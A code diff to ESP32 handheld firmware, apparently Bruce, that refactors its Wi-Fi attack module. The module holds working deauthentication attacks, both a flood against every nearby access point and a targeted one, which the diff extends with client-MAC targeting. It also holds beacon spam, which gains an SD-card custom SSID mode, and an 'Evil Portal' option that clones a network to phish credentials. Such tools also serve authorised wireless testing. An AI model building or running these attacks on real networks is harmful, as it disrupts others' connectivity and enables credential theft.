@@ -3,10 +3,11 @@
 // Arduino IDE needs to be tweeked to work, follow the instructions: https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup
 // But change the file in: C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
 #include <Arduino.h>
-#include "core/globals.h"
+#include <globals.h>
 #include "core/display.h"
 #include "core/main_menu.h"
 #include "core/mykeyboard.h"
+#include "core/utils.h"
 #include "core/wifi_common.h"
 #include "wifi_atks.h"
 #include "esp_wifi.h"
@@ -51,20 +52,29 @@ void send_raw_frame(const uint8_t *frame_buffer, int size)
 ** function: wsl_bypasser_send_raw_frame
 ** @brief: prepare the frame to deploy the attack
 ***************************************************************************************/
-void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan)
+void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6])
 {
   Serial.begin(115200);
-  Serial.print("\nPreparing deauth frame to -> ");
+  Serial.print("\nPreparing deauth frame to AP -> ");
   for (int j = 0; j < 6; j++)
   {
     Serial.print(ap_record->bssid[j], HEX);
     if (j < 5)
       Serial.print(":");
   }
+  Serial.print(" and Tgt: ");
+    for (int j = 0; j < 6; j++)
+  {
+    Serial.print(target[j], HEX);
+    if (j < 5)
+      Serial.print(":");
+  }
+
   esp_err_t err;
   err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
   if(err!= ESP_OK) Serial.println("Error changing channel");
   delay(50);
+  memcpy(&deauth_frame[4] , target          , 6); // Client MAC Address for Station Deauth
   memcpy(&deauth_frame[10], ap_record->bssid, 6);
   memcpy(&deauth_frame[16], ap_record->bssid, 6);
 }
@@ -77,17 +87,17 @@ void wifi_atk_info(String tssid, String mac, uint8_t channel)
 {
   // desenhar a tela
   drawMainBorder();
-  tft.setTextColor(FGCOLOR);
+  tft.setTextColor(bruceConfig.priColor);
   tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
   tft.drawString("AP: " + tssid, 10, 48);
   tft.drawString("Channel: " + String(channel), 10, 66);
   tft.drawString(mac, 10, 84);
-  tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tft.height() - 20);
+  tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
 
   delay(300);
-  while (!checkSelPress())
+  while (!check(SelPress))
   {
-    while (!checkSelPress())
+    while (!check(SelPress))
     {
       yield();
     } // timerless debounce
@@ -111,15 +121,15 @@ void wifi_atk_menu()
        { beaconAttack(); }},
       {"Deauth Flood", [=]()
        { deauthFloodAttack(); }},
+      {"Main Menu", [&]()
+       { returnToMenu=true; }}
   };
-  delay(200);
   loopOptions(options);
-  delay(200);
   if (scanAtks)
   {
     int nets;
     WiFi.mode(WIFI_MODE_STA);
-    displayRedStripe("Scanning..", TFT_WHITE, FGCOLOR);
+    displayTextLine("Scanning..");
     nets = WiFi.scanNetworks();
     ap_records.clear();
     options = {};
@@ -140,9 +150,7 @@ void wifi_atk_menu()
     options.push_back({"Main Menu", [=]()
                        { backToMenu(); }});
 
-    delay(200);
     loopOptions(options);
-    delay(200);
   }
 }
 
@@ -153,7 +161,7 @@ void deauthFloodAttack()
   if (!WiFi.softAP("DeauthFlood", emptyString, 1, 1, 4, false))
   {
     displayError("Failed to start AP");
-    while (!checkSelPress())
+    while (!check(SelPress))
     {
       yield();
     }
@@ -162,8 +170,8 @@ void deauthFloodAttack()
   wifiConnected = true;
   int nets;
   WiFi.mode(WIFI_AP);
-ScanNets:    
-  displayRedStripe("Scanning..", TFT_WHITE, FGCOLOR);
+ScanNets:
+  displayTextLine("Scanning..");
   nets = WiFi.scanNetworks();
   ap_records.clear();
   for (int i = 0; i < nets; i++)
@@ -180,14 +188,14 @@ ScanNets:
   uint32_t rescan_counter = millis();
   uint16_t count = 0;
   uint8_t channel=0;
-  drawMainBorder(true);
+  drawMainBorderWithTitle("Deauth Flood");
   while (true)
   {
     for (const auto &record : ap_records)
     {
       channel = record.primary;
       wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
-      tft.setCursor(10, HEIGHT - 45);
+      tft.setCursor(10, tftHeight - 45);
       tft.println("Channel " + String(record.primary) + "    ");
       for (int i=0; i<100; i++) {
         send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
@@ -197,19 +205,19 @@ ScanNets:
     // Update counter every 2 seconds
     if (millis() - lastTime > 2000)
     {
-      tft.setCursor(10, 28);
-      tft.setTextColor(FGCOLOR,BGCOLOR);
-      tft.println("Deauth Flood");
-      tft.setCursor(10, HEIGHT - 25);
+      drawMainBorderWithTitle("Deauth Flood");
+      tft.setCursor(10, tftHeight - 25);
       tft.print("Frames:               ");
-      tft.setCursor(10, HEIGHT - 25);
+      tft.setCursor(10, tftHeight - 25);
       tft.println("Frames: " + String(count / 2) + "/s   ");
+      tft.setCursor(10, tftHeight - 45);
+      tft.println("Channel " + String(channel) + "    ");
       count = 0;
       lastTime = millis();
     }
     if (millis() - rescan_counter > 60000) goto ScanNets; //re-scan networks for more relability
 
-    if (checkEscPress())
+    if (check(EscPress))
       break;
   }
 
@@ -229,16 +237,14 @@ void target_atk_menu(String tssid, String mac, uint8_t channel)
       {"Deauth", [=]()
        { target_atk(tssid, mac, channel); }},
       {"Clone Portal", [=]()
-       { startEvilPortal(tssid, channel, false); }},
+       { EvilPortal(tssid, channel, false); }},
       {"Deauth+Clone", [=]()
-       { startEvilPortal(tssid, channel, true); }},
+       { EvilPortal(tssid, channel, true); }},
       {"Main Menu", [=]()
        { backToMenu(); }},
   };
 
-  delay(200);
   loopOptions(options);
-  delay(200);
 }
 
 /***************************************************************************************
@@ -252,7 +258,7 @@ void target_atk(String tssid, String mac, uint8_t channel)
   WiFi.mode(WIFI_AP);
   if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false))
   {
-    while (!checkSelPress())
+    while (!check(SelPress))
     {
       yield();
     }
@@ -267,9 +273,9 @@ void target_atk(String tssid, String mac, uint8_t channel)
   tmp = millis();
   bool redraw = true;
   delay(200);
-  checkSelPress();
+  check(SelPress);
 
-  tft.setTextColor(FGCOLOR, BGCOLOR);
+  tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
   tft.setTextSize(FM);
   setCpuFrequencyMhz(240);
   while (1)
@@ -277,13 +283,12 @@ void target_atk(String tssid, String mac, uint8_t channel)
     if (redraw)
     {
       // desenhar a tela
-      drawMainBorder();
-      tft.setTextColor(TFT_RED,BGCOLOR);
-      tft.drawCentreString("Target Deauth", tft.width() / 2, 28, SMOOTH_FONT);
-      tft.setTextColor(FGCOLOR,BGCOLOR);
-      tft.drawString("AP: " + tssid, 15, 48);
-      tft.drawString("Channel: " + String(channel), 15, 66);
-      tft.drawString(mac, 15, 84);
+      drawMainBorderWithTitle("Target Deauth");
+      tft.setTextColor(bruceConfig.priColor,bruceConfig.bgColor);
+      padprintln("");
+      padprintln("AP: " + tssid);
+      padprintln("Channel: " + String(channel));
+      padprintln(mac);
       delay(50);
       redraw = false;
     }
@@ -293,33 +298,33 @@ void target_atk(String tssid, String mac, uint8_t channel)
     // atualize counter
     if (millis() - tmp > 2000)
     {
-      tft.setCursor(15, HEIGHT - 23);
+      tft.setCursor(15, tftHeight - 23);
       tft.print("Frames: " + String(count / 2) + "/s");
       count = 0;
       tmp = millis();
     }
     // Pause attack
-    if (checkSelPress())
+    if (check(SelPress))
     {
-      displayRedStripe("Deauth Paused", TFT_WHITE, FGCOLOR);
-      while (checkSelPress())
+      displayTextLine("Deauth Paused");
+      while (check(SelPress))
       {
         delay(50);
       } // timeless debounce
       // wait to restart or kick out of the function
-      while (!checkSelPress())
+      while (!check(SelPress))
       {
-        if (checkEscPress())
+        if (check(EscPress))
           break;
       }
-      while (checkSelPress())
+      while (check(SelPress))
       {
         delay(50);
       } // timeless debounce
       redraw = true;
     }
     // Checks para sair do while
-    if (checkEscPress())
+    if (check(EscPress))
       break;
   }
   wifiDisconnect();
@@ -537,12 +542,12 @@ void beaconSpamList(const char list[])
     // send packet
     for (int k = 0; k < 3; k++)
     {
-      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0) == 0;
+      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0);
       delay(1);
     }
     i += j;
     ;
-    if (checkEscPress())
+    if (check(EscPress))
       break;
   }
 }
@@ -561,21 +566,23 @@ void beaconAttack()
   options = {
       {"Funny SSID", [&]()
        { BeaconMode = 0; txt = "Spamming Funny"; }},
-      {"Rucky Roll", [&]()
+      {"Ricky Roll", [&]()
        { BeaconMode = 1; txt = "Spamming Ricky"; }},
       {"Random SSID", [&]()
        { BeaconMode = 2; txt = "Spamming Random"; }},
+      {"Custom SSIDs", [&]()
+       { BeaconMode = 3; txt = "Spamming Custom"; }},
+      {"Main Menu", [&]()
+       { returnToMenu=true; }}
   };
-  delay(200);
   loopOptions(options);
-  delay(200);
 
   wifiConnected = true; // display wifi icon
-  drawMainMenu(0);
-  displayRedStripe(txt, TFT_WHITE, FGCOLOR);
+  String beaconFile = "";
+  File file;
+  FS *fs;
   while (1)
   {
-    displayRedStripe(String(BeaconMode), TFT_WHITE, FGCOLOR);
     delay(200);
     if (BeaconMode == 0)
     {
@@ -590,8 +597,35 @@ void beaconAttack()
       char *randoms = randomSSID();
       beaconSpamList(randoms);
     }
-    if (checkEscPress())
+    else if (BeaconMode == 3)
+    {
+      if(!file) {
+        options = { };
+
+        if(setupSdCard()) {
+          options.push_back({"SD Card", [&]()  { fs=&SD; }});
+        }
+        options.push_back({"LittleFS",  [&]()   { fs=&LittleFS; }});
+        options.push_back({"Main Menu", [&]()   { fs=nullptr; returnToMenu=true; }});
+
+        loopOptions(options);
+        if(fs!=nullptr) beaconFile = loopSD(*fs,true,"TXT");
+        else goto END;
+        file=fs->open(beaconFile,FILE_READ);
+        beaconFile = file.readString();
+        beaconFile.replace("\r\n", "\n");
+      }
+      
+      const char* randoms = beaconFile.c_str();
+      beaconSpamList(randoms);
+      
+    }
+    if (check(EscPress) || returnToMenu){
+      if(BeaconMode==3) file.close();
       break;
+    }
+    displayTextLine(String(txt));
   }
+  END:
   wifiDisconnect();
 }
